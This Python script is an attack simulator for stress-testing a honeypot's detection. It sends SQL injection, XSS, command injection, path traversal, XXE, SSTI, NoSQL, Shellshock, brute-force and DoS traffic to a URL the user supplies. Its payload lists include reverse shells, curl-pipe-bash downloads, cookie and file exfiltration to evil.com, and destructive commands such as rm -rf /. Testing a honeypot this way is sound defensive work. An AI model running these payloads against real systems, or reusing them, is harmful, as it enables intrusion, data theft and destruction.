#!/usr/bin/env python3
"""
Attack Simulator - Comprehensive Honeypot Testing (ENHANCED)
=============================================================
Generates realistic, high-volume attack patterns to thoroughly test
the honeypot's detection capabilities.

Attack Types:
  1. SQL Injection (SQLi)            - 20+ payloads
  2. Cross-Site Scripting (XSS)      - 15+ payloads
  3. Brute Force Login               - Multiple credential combos
  4. Directory Traversal             - Path manipulation
  5. Command Injection               - OS command payloads
  6. Port Scanning Behavior          - Endpoint enumeration
  7. Bot/Crawler Activity            - Malicious bots
  8. DoS Patterns                    - Rapid requests
  9. PHP/WordPress Exploits          - CMS attacks
 10. Authentication Bypass           - Auth manipulation
 11. Shellshock (CVE-2014-6271)     - Legacy exploit
 12. XML External Entity (XXE)      - XML injection
 13. Server-Side Template Injection - Template exploits
 14. NoSQL Injection                - NoSQL attacks

Usage:
  python3 attack_simulator.py --url https://your-ngrok-url.ngrok-free.dev --attacks 500 --parallel
"""

import argparse
import random
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import List, Dict
import urllib3
import json

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════════════════════
# ATTACK PAYLOADS (SIGNIFICANTLY EXPANDED)
# ═══════════════════════════════════════════════════════════════════════════

SQL_INJECTION_PAYLOADS = [
    # Basic SQLi
    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "admin' --",
    "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#", "' or 1=1/*",

    # UNION-based
    "' UNION SELECT NULL--", "' UNION SELECT NULL, NULL--",
    "' UNION SELECT @@version--", "' UNION SELECT user()--",
    "' UNION SELECT database()--", "' UNION ALL SELECT 1,2,3,4,5--",
    "-1' UNION SELECT 1,2,3,4,5,6,7,8--",

    # Blind SQLi
    "' AND 1=1--", "' AND 1=2--", "admin' AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",

    # Boolean-based
    "' OR 'x'='x", "' AND 'x'='x", "admin' AND '1'='1",
    "' OR EXISTS(SELECT * FROM users)--",

    # Error-based
    "' AND 1=CONVERT(INT,(SELECT @@version))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",

    # Stacked queries
    "'; DROP TABLE users--", "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
    "1; UPDATE users SET password='hacked'--",

    # Advanced
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "admin' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--",
]

XSS_PAYLOADS = [
    # Basic XSS
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",

    # Image-based
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=javascript:alert('XSS')>",

    # SVG-based
    "<svg/onload=alert('XSS')>",
    "<svg><script>alert(1)</script></svg>",

    # Event handlers
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert(1) autofocus>",

    # Encoded
    "javascript:alert('XSS')",
    "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",

    # Data exfiltration
    "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
    "<img src=x onerror='new Image().src=\"http://evil.com/?c=\"+document.cookie'>",

    # Filter bypass
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
    "<iframe src='javascript:alert(1)'>",
]

COMMAND_INJECTION_PAYLOADS = [
    # Basic command injection
    "; ls -la", "| cat /etc/passwd", "&& whoami", "|| id",

    # Reverse shells
    "| nc -e /bin/sh attacker.com 4444",
    "; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
    "| python -c 'import socket,subprocess,os;...'",

    # File access
    "`cat /etc/shadow`", "$(cat /etc/passwd)", "; cat /root/.ssh/id_rsa",

    # Download & execute
    "; curl http://evil.com/shell.sh | bash",
    "| wget http://evil.com/backdoor.py && python backdoor.py",

    # Destructive
    "; rm -rf /", "&& chmod 777 /", "| dd if=/dev/zero of=/dev/sda",

    # Exfiltration
    "; curl -X POST -d @/etc/passwd http://evil.com/data",
    "; tar -czf - /var/www | curl -X POST --data-binary @- http://evil.com/",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "../../../../../../etc/hosts",
    "../../../var/log/apache2/access.log",
    "../../../../../../../../etc/shadow",
    "../../../../../proc/self/environ",
    "../../../../../../boot.ini",
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>',
    '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>',
]

SSTI_PAYLOADS = [
    # Jinja2/Flask
    "{{7*7}}",
    "{{config}}",
    "{{config.items()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",

    # Twig
    "{{7*'7'}}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}",

    # FreeMarker
    "${''.class.forName('java.lang.Runtime').getRuntime().exec('id')}",
]

NOSQL_INJECTION_PAYLOADS = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
]

COMMON_USERNAMES = [
    "admin", "administrator", "root", "user", "test", "guest", "demo",
    "Administrator", "postgres", "mysql", "oracle", "sa", "tomcat",
    "webmaster", "ftpuser", "backup", "support", "admin123", "system",
    "sysadmin", "superuser", "developer", "dbadmin"
]

COMMON_PASSWORDS = [
    "password", "123456", "admin", "12345678", "password123", "admin123",
    "root", "toor", "pass", "test", "guest", "changeme", "welcome",
    "qwerty", "letmein", "monkey", "dragon", "master", "sunshine",
    "secret", "password1", "123456789", "12345", "1234", "111111",
    "Password1!", "Admin123!", "P@ssw0rd", "Welcome123"
]

MALICIOUS_USER_AGENTS = [
    "sqlmap/1.7", "Nikto/2.1.6", "Nmap Scripting Engine",
    "Metasploit/5.0", "Havij", "Acunetix/1.0", "ZmEu",
    "Morfeus Scanner", "DirBuster-1.0", "Python-urllib/2.7",
    "masscan/1.3.2", "dirbuster/1.0", "gobuster/3.5",
    "Hydra/9.4", "w3af/2.0", "Burp Suite/2.0",
    "() { :; }; /bin/bash -c 'wget http://evil.com/shell'",  # Shellshock
]

BOT_USER_AGENTS = [
    "Mozilla/5.0 (compatible; Baiduspider/2.0)",
    "Bytespider", "MJ12bot/v1.4.8", "AhrefsBot/7.0",
    "SemrushBot/7.0", "DotBot/1.1", "Scrapy/2.5.0",
    "PetalBot", "YandexBot/3.0"
]

EXPLOIT_PATHS = [
    "/admin", "/administrator", "/wp-admin", "/wp-login.php",
    "/phpmyadmin", "/phpMyAdmin", "/pma", "/mysql", "/db",
    "/database", "/console", "/admin/login", "/admin/admin",
    "/admin/index.php", "/admin/dashboard", "/cpanel", "/cgi-bin/",
    "/shell.php", "/c99.php", "/r57.php", "/backup.sql", "/.env",
    "/.git/config", "/config.php", "/wp-config.php", "/configuration.php",
    "/config/database.yml", "/api/v1/auth", "/api/admin", "/.aws/credentials",
    "/backup.zip", "/database.sql", "/.ssh/id_rsa"
]

# ═══════════════════════════════════════════════════════════════════════════
# ATTACK SIMULATOR CLASS
# ═══════════════════════════════════════════════════════════════════════════

class AttackSimulator:
    def __init__(self, base_url: str, verbose: bool = True):
        self.base_url = base_url.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.attack_count = 0
        self.success_count = 0
        self.attack_stats = {}

    def log(self, msg: str, level: str = "INFO"):
        if self.verbose:
            timestamp = datetime.now().strftime("%H:%M:%S")
            icons = {"INFO": "🎯", "SUCCESS": "✅", "ERROR": "❌", "WARN": "⚠️"}
            print(f"[{timestamp}] {icons.get(level, '•')} {msg}")

    def _make_request(self, method: str, path: str, data: dict = None,
                     headers: dict = None, timeout: int = 5) -> bool:
        """Make HTTP request and return success status"""
        try:
            url = f"{self.base_url}{path}"
            default_headers = {
                "User-Agent": random.choice(MALICIOUS_USER_AGENTS + BOT_USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
            }
            if headers:
                default_headers.update(headers)

            if method.upper() == "GET":
                resp = self.session.get(url, headers=default_headers,
                                       timeout=timeout, verify=False, allow_redirects=False)
            else:
                resp = self.session.post(url, data=data, headers=default_headers,
                                        timeout=timeout, verify=False, allow_redirects=False)

            self.attack_count += 1
            if resp.status_code in [200, 301, 302, 400, 403, 404, 500]:
                self.success_count += 1
                return True
            return False

        except requests.exceptions.Timeout:
            self.attack_count += 1
            return False
        except Exception:
            self.attack_count += 1
            return False

    def _track_attack(self, attack_type: str):
        """Track attack statistics"""
        self.attack_stats[attack_type] = self.attack_stats.get(attack_type, 0) + 1

    # ───────────────────────────────────────────────────────────────────────
    # 1. SQL Injection Attacks
    # ───────────────────────────────────────────────────────────────────────

    def sql_injection_attack(self) -> bool:
        """Simulate SQL injection attempts"""
        payload = random.choice(SQL_INJECTION_PAYLOADS)
        username = random.choice(["admin", "user", "test", "'admin'"])

        data = {
            "username": f"{username}{payload}" if random.random() > 0.3 else payload,
            "password": random.choice(COMMON_PASSWORDS)
        }

        self.log(f"SQLi → {data['username'][:50]}")
        self._track_attack("SQLi")
        return self._make_request("POST", "/login", data=data)

    # ───────────────────────────────────────────────────────────────────────
    # 2. Cross-Site Scripting (XSS)
    # ───────────────────────────────────────────────────────────────────────

    def xss_attack(self) -> bool:
        """Simulate XSS attempts"""
        payload = random.choice(XSS_PAYLOADS)

        data = {
            "username": payload,
            "password": "password"
        }

        self.log(f"XSS → {payload[:50]}")
        self._track_attack("XSS")
        return self._make_request("POST", "/login", data=data)

    # ───────────────────────────────────────────────────────────────────────
    # 3. Brute Force Attacks
    # ───────────────────────────────────────────────────────────────────────

    def brute_force_attack(self, attempts: int = 5) -> int:
        """Simulate credential brute forcing"""
        self.log(f"BruteForce → {attempts} attempts")
        success = 0

        username = random.choice(COMMON_USERNAMES)
        for i in range(attempts):
            password = random.choice(COMMON_PASSWORDS)
            data = {"username": username, "password": password}

            if self._make_request("POST", "/login", data=data):
                success += 1

            self._track_attack("BruteForce")
            time.sleep(random.uniform(0.05, 0.3))

        return success

    # ───────────────────────────────────────────────────────────────────────
    # 4. Path Traversal
    # ───────────────────────────────────────────────────────────────────────

    def path_traversal_attack(self) -> bool:
        """Simulate directory traversal attempts"""
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        path = f"/login?file={payload}"

        self.log(f"PathTraversal → {payload[:40]}")
        self._track_attack("PathTraversal")
        return self._make_request("GET", path)

    # ───────────────────────────────────────────────────────────────────────
    # 5. Command Injection
    # ───────────────────────────────────────────────────────────────────────

    def command_injection_attack(self) -> bool:
        """Simulate OS command injection"""
        payload = random.choice(COMMAND_INJECTION_PAYLOADS)

        data = {
            "username": f"admin{payload}",
            "password": "test"
        }

        self.log(f"CmdInject → {payload[:40]}")
        self._track_attack("CmdInject")
        return self._make_request("POST", "/login", data=data)

    # ───────────────────────────────────────────────────────────────────────
    # 6. Port Scanning Behavior
    # ───────────────────────────────────────────────────────────────────────

    def port_scan_attack(self, endpoints: int = 10) -> int:
        """Simulate port scanning behavior"""
        self.log(f"PortScan → probing {endpoints} endpoints")
        success = 0

        paths = random.sample(EXPLOIT_PATHS, min(endpoints, len(EXPLOIT_PATHS)))
        headers = {"User-Agent": "Nmap Scripting Engine"}

        for path in paths:
            if self._make_request("GET", path, headers=headers, timeout=2):
                success += 1
            self._track_attack("PortScan")
            time.sleep(random.uniform(0.01, 0.1))

        return success

    # ───────────────────────────────────────────────────────────────────────
    # 7. Bot Activity
    # ───────────────────────────────────────────────────────────────────────

    def bot_attack(self) -> bool:
        """Simulate malicious bot activity"""
        bot_ua = random.choice(BOT_USER_AGENTS)
        headers = {"User-Agent": bot_ua}
        path = random.choice(["/", "/login", "/admin", "/wp-admin"])

        self.log(f"Bot → {bot_ua[:30]}")
        self._track_attack("Bot")
        return self._make_request("GET", path, headers=headers)

    # ───────────────────────────────────────────────────────────────────────
    # 8. DoS Pattern (Rapid Requests)
    # ───────────────────────────────────────────────────────────────────────

    def dos_attack(self, count: int = 20) -> int:
        """Simulate DoS by rapid repeated requests"""
        self.log(f"DoS → {count} rapid requests")
        success = 0

        for i in range(count):
            data = {"username": f"user{i}", "password": "test"}
            if self._make_request("POST", "/login", data=data, timeout=2):
                success += 1
            self._track_attack("DoS")

        return success

    # ───────────────────────────────────────────────────────────────────────
    # 9. WordPress/PHP Exploits
    # ───────────────────────────────────────────────────────────────────────

    def wordpress_exploit_attack(self) -> bool:
        """Simulate WordPress/PHP exploit attempts"""
        wp_paths = [
            "/wp-admin/install.php",
            "/wp-content/plugins/",
            "/xmlrpc.php",
            "/wp-login.php?action=register",
            "/wp-json/wp/v2/users",
            "/wp-content/uploads/shell.php",
        ]

        path = random.choice(wp_paths)
        self.log(f"WP-Exploit → {path}")
        self._track_attack("WP-Exploit")
        return self._make_request("GET", path)

    # ───────────────────────────────────────────────────────────────────────
    # 10. Authentication Bypass
    # ───────────────────────────────────────────────────────────────────────

    def auth_bypass_attack(self) -> bool:
        """Simulate authentication bypass attempts"""
        bypass_payloads = [
            {"username": "admin' or '1'='1' --", "password": "anything"},
            {"username": "admin", "password": "' or '1'='1"},
            {"username": "' or 1=1 --", "password": "' or 1=1 --"},
            {"username": "admin'/*", "password": "*/OR/**/1=1#"},
            {"username": json.dumps({"$ne": None}), "password": json.dumps({"$ne": None})},
        ]

        data = random.choice(bypass_payloads)
        self.log(f"AuthBypass → {str(data['username'])[:40]}")
        self._track_attack("AuthBypass")
        return self._make_request("POST", "/login", data=data)

    # ───────────────────────────────────────────────────────────────────────
    # 11. Shellshock (CVE-2014-6271)
    # ───────────────────────────────────────────────────────────────────────

    def shellshock_attack(self) -> bool:
        """Simulate Shellshock exploit"""
        headers = {
            "User-Agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'"
        }

        self.log("Shellshock → CVE-2014-6271")
        self._track_attack("Shellshock")
        return self._make_request("GET", "/login", headers=headers)

    # ───────────────────────────────────────────────────────────────────────
    # 12. XXE (XML External Entity)
    # ───────────────────────────────────────────────────────────────────────

    def xxe_attack(self) -> bool:
        """Simulate XXE injection"""
        payload = random.choice(XXE_PAYLOADS)
        headers = {"Content-Type": "application/xml"}

        self.log("XXE → XML Entity Injection")
        self._track_attack("XXE")
        return self._make_request("POST", "/login", data=payload, headers=headers)

    # ───────────────────────────────────────────────────────────────────────
    # 13. SSTI (Server-Side Template Injection)
    # ───────────────────────────────────────────────────────────────────────

    def ssti_attack(self) -> bool:
        """Simulate SSTI attempts"""
        payload = random.choice(SSTI_PAYLOADS)
        data = {"username": payload, "password": "test"}

        self.log(f"SSTI → {payload[:30]}")
        self._track_attack("SSTI")
        return self._make_request("POST", "/login", data=data)

    # ───────────────────────────────────────────────────────────────────────
    # 14. NoSQL Injection
    # ───────────────────────────────────────────────────────────────────────

    def nosql_injection_attack(self) -> bool:
        """Simulate NoSQL injection"""
        payload = random.choice(NOSQL_INJECTION_PAYLOADS)
        headers = {"Content-Type": "application/json"}

        data_dict = {"username": payload, "password": payload}
        self.log(f"NoSQL → {payload[:30]}")
        self._track_attack("NoSQL")
        return self._make_request("POST", "/login", data=json.dumps(data_dict), headers=headers)


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK ORCHESTRATOR (ENHANCED)
# ═══════════════════════════════════════════════════════════════════════════

def run_attack_campaign(base_url: str, total_attacks: int = 500,
                       parallel: bool = False, threads: int = 10):
    """
    Run comprehensive attack campaign with enhanced statistics
    """

    simulator = AttackSimulator(base_url)

    print("\n" + "="*80)
    print("🎭 ENHANCED ATTACK SIMULATOR - Honeypot Stress Testing")
    print("="*80)
    print(f"Target:         {base_url}")
    print(f"Total Attacks:  {total_attacks}")
    print(f"Mode:           {'Parallel' if parallel else 'Sequential'}")
    if parallel:
        print(f"Threads:        {threads}")
    print("="*80 + "\n")

    # Attack distribution (weighted)
    attack_types = [
        (simulator.sql_injection_attack, "SQLi", 22),
        (simulator.xss_attack, "XSS", 12),
        (lambda: simulator.brute_force_attack(10), "BruteForce", 18),
        (simulator.path_traversal_attack, "PathTraversal", 8),
        (simulator.command_injection_attack, "CmdInject", 10),
        (lambda: simulator.port_scan_attack(15), "PortScan", 12),
        (simulator.bot_attack, "Bot", 8),
        (lambda: simulator.dos_attack(30), "DoS", 4),
        (simulator.wordpress_exploit_attack, "WP-Exploit", 6),
        (simulator.auth_bypass_attack, "AuthBypass", 6),
        (simulator.shellshock_attack, "Shellshock", 2),
        (simulator.xxe_attack, "XXE", 3),
        (simulator.ssti_attack, "SSTI", 4),
        (simulator.nosql_injection_attack, "NoSQL", 5),
    ]

    # Build attack plan
    total_weight = sum(weight for _, _, weight in attack_types)
    attack_plan = []

    for attack_fn, name, weight in attack_types:
        count = int((weight / total_weight) * total_attacks)
        attack_plan.extend([attack_fn] * count)

    # Shuffle for realistic mixed attack pattern
    random.shuffle(attack_plan)
    attack_plan = attack_plan[:total_attacks]

    start_time = time.time()

    # Execute attacks
    if parallel:
        print(f"⚡ Running {len(attack_plan)} attacks in parallel with {threads} threads...\n")
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack_fn) for attack_fn in attack_plan]

            completed = 0
            for future in as_completed(futures):
                try:
                    future.result()
                    completed += 1
                    if completed % 50 == 0:
                        print(f"   Progress: {completed}/{len(attack_plan)} attacks completed")
                except Exception as e:
                    pass
    else:
        print(f"🔄 Running {len(attack_plan)} attacks sequentially...\n")
        for i, attack_fn in enumerate(attack_plan):
            try:
                attack_fn()
                if (i + 1) % 50 == 0:
                    print(f"   Progress: {i+1}/{len(attack_plan)} attacks completed")
                time.sleep(random.uniform(0.1, 0.5))
            except Exception:
                pass

    elapsed = time.time() - start_time

    # Enhanced Statistics
    print("\n" + "="*80)
    print("📊 ATTACK CAMPAIGN SUMMARY")
    print("="*80)
    print(f"Total Attacks:       {simulator.attack_count}")
    print(f"Successful:          {simulator.success_count}")
    print(f"Success Rate:        {(simulator.success_count/simulator.attack_count*100) if simulator.attack_count > 0 else 0:.1f}%")
    print(f"Duration:            {elapsed:.2f} seconds")
    print(f"Attacks/Second:      {simulator.attack_count/elapsed:.2f}")

    print("\n" + "-"*80)
    print("Attack Type Breakdown:")
    print("-"*80)
    for attack_type, count in sorted(simulator.attack_stats.items(), key=lambda x: x[1], reverse=True):
        bar = "█" * int(count / max(simulator.attack_stats.values()) * 40)
        print(f"  {attack_type:<18} {count:>4} {bar}")

    print("\n" + "="*80)
    print("\n✅ Check your honeypot dashboard at http://localhost:8000")
    print("✅ View logs: logs/honeypot_logs.json")
    print(f"✅ Controller should have processed ~{simulator.attack_count} attacks!\n")


# ═══════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Enhanced Attack Simulator for Honeypot Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic usage (500 attacks)
  python3 attack_simulator.py --url https://your-url.ngrok-free.dev

  # High-intensity parallel attack
  python3 attack_simulator.py --url https://your-url.ngrok-free.dev --attacks 1000 --parallel --threads 20

  # Slow, realistic scan
  python3 attack_simulator.py --url http://localhost:5000 --attacks 200

  # Extreme stress test
  python3 attack_simulator.py --url https://your-url.ngrok-free.dev --attacks 5000 --parallel --threads 50
        """
    )

    parser.add_argument(
        "--url",
        type=str,
        required=True,
        help="Target honeypot URL"
    )

    parser.add_argument(
        "--attacks",
        type=int,
        default=500,
        help="Total number of attacks (default: 500)"
    )

    parser.add_argument(
        "--parallel",
        action="store_true",
        help="Run attacks in parallel"
    )

    parser.add_argument(
        "--threads",
        type=int,
        default=10,
        help="Number of parallel threads (default: 10)"
    )

    args = parser.parse_args()

    try:
        run_attack_campaign(
            base_url=args.url,
            total_attacks=args.attacks,
            parallel=args.parallel,
            threads=args.threads
        )
    except KeyboardInterrupt:
        print("\n\n⚠️  Attack campaign interrupted by user")
    except Exception as e:
        print(f"\n\n❌ Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
